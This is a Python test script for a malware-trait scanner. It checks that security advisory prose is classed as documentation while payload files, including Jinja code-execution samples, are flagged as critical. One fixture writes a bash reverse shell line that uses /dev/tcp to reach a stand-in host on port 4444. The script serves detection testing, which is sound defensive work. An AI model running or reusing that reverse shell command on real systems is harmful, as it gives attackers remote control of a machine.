#!/usr/bin/env python3
"""Check inert advisory prose against the same payload used as executable input."""
import argparse
import json
import os
from pathlib import Path
import shutil
import subprocess
import tarfile
import tempfile

ROOT = Path(__file__).resolve().parents[3]
HERE = Path(__file__).resolve().parent
PREFIX = "metadata/package/documentation/security-advisory::osv-advisory-report-structure"
SHELL = "objectives/command-and-control/reverse-shell/dev-tcp::dev-tcp-bash-stdin-redirect"
JINJA = "objectives/execution/interpreter/eval/remote::jinja-template-code-execution"
FSSPEC = "objectives/execution/interpreter/eval/remote::fsspec-reference-jinja-code-execution"


def documents(text):
    decoder = json.JSONDecoder()
    while text.strip():
        text = text.lstrip()
        item, end = decoder.raw_decode(text)
        yield item
        text = text[end:]


def traits(file):
    return {t["id"]: t["crit"] for t in file.get("traits", [])}


def check(cleave):
    # Copy to a neutral path so test-directory suppressors cannot determine results.
    with tempfile.TemporaryDirectory(prefix="advisory-review-") as directory:
        temp = Path(directory)
        inputs = []
        for fixture in HERE.glob("*.json"):
            if fixture.name == "review.json":
                continue
            target = temp / fixture.name
            shutil.copyfile(fixture, target)
            inputs.append(target)
        shutil.copyfile(HERE / "vllm-poc.py", temp / "payload.py")
        inputs.append(temp / "payload.py")
        (temp / "live.sh").write_text(
            "bash -i >& /dev/tcp/198.51.100.10/4444 0>&1\n")
        with tarfile.open(temp / "mixed.tar", "w") as archive:
            archive.add(temp / "GHSA-hjq4-87xh-g4fv.json", arcname="notice.json")
            archive.add(temp / "live.sh", arcname="run.sh")
        inputs.extend([temp / "live.sh", temp / "mixed.tar"])
        process = subprocess.run(
            [cleave, "--traits-dir", str(ROOT), "--format", "json",
             *map(str, inputs)], text=True, capture_output=True)
        if process.returncode:
            raise RuntimeError(process.stderr)
        files = [f for report in documents(process.stdout) for f in report["files"]]
        by_name = {Path(f["path"].split("!!")[-1]).name: f for f in files}
        for name in ["GHSA-hjq4-87xh-g4fv.json", "GHSA-w48f-wwwf-f5fr.json",
                     "GHSA-3f7w-p8vr-4v5f.json", "notice.json"]:
            actual = traits(by_name[name])
            assert PREFIX in actual, (name, actual)
            assert not any(v >= 4 for v in actual.values()), (name, actual)
        for name in ["payload.py", "live.sh", "run.sh", "mixed.tar"]:
            assert traits(by_name[name]).get(SHELL) == 5, name
        for name in ["jinja-payload.json", "reference-payload.json",
                     "hybrid-advisory-reference.json", "quoted-details-only.json"]:
            actual = traits(by_name[name])
            assert actual.get(JINJA) == 5, (name, actual)
            assert PREFIX not in actual, name
        for name in ["reference-payload.json", "hybrid-advisory-reference.json"]:
            assert traits(by_name[name]).get(FSSPEC) == 5, name
        performance = HERE / "performance"
        expected = json.loads((performance / "expected.json").read_text())
        inputs = []
        for name in expected["files"]:
            target = temp / name
            shutil.copyfile(performance / name, target)
            inputs.append(target)
        process = subprocess.run(
            [cleave, "--traits-dir", str(ROOT), "--format", "json",
             *map(str, inputs)], text=True, capture_output=True)
        if process.returncode:
            raise RuntimeError(process.stderr)
        files = [f for report in documents(process.stdout) for f in report["files"]]
        actual = {Path(f["path"]).name: traits(f) for f in files}
        for name, wanted in expected["files"].items():
            got = {k: v for k, v in actual[name].items() if k in expected["ids"]}
            assert got == wanted, (name, wanted, got)
        print("PASS: advisory prose, extracted payloads, hybrid input, archive isolation")
        print(f"PASS: {len(inputs)} performance controls retain their baseline findings")


if __name__ == "__main__":
    parser = argparse.ArgumentParser()
    parser.add_argument("--cleave", default=os.environ.get("CLEAVE", "cleave"))
    check(parser.parse_args().cleave)
